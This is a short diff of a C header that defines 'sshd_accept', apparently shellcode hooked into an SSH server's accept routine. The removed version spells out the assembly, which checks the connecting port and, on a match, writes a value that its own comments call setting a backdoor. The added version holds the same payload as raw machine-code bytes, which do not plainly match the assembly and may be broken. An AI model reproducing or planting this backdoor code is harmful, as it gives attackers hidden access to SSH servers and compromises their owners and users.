@@ -1,6 +1,6 @@
-#ifndef SSHD_SCCEPT
-#define SSHD_SCCEPT
+#ifndef SSHD_ACCEPT
+#define SSHD_ACCEPT
 
-char sshd_accept[] = "push 0x2b;pop rax;syscall;;push rdi;push rsi;push rdx;push rcx;push r10;push r8;push r9;push rax;;lea r9, %lx;// elf_base;mov al, [rsi + 3];// get connection port;;cmp al, 0x21;jne return_normal;;backdoor:;mov [r9 + %lx], 0x3316;// %lx = rw_gap;// set backdoor;;return_normal:;;pop rax;pop r9;pop r8;pop r10;pop rcx;pop rdx;pop rsi;pop rdi;;ret;";
+char sshd_accept[] = "\xc3\x49\x8d\x01\xc3\x6a\x2b\x58\x0f\x05\xc3\x6a\x2b\x58\x0f\x05\x66\x83\x7e\x02\x21\x74\x06\xb8\x00\x00\x00\x00\xc3\x49\x8d\x01\xc7\x04\x25\x00\x00\x00\x00\xf4\x0c\x00\x00\xeb\xea";
 
 #endif
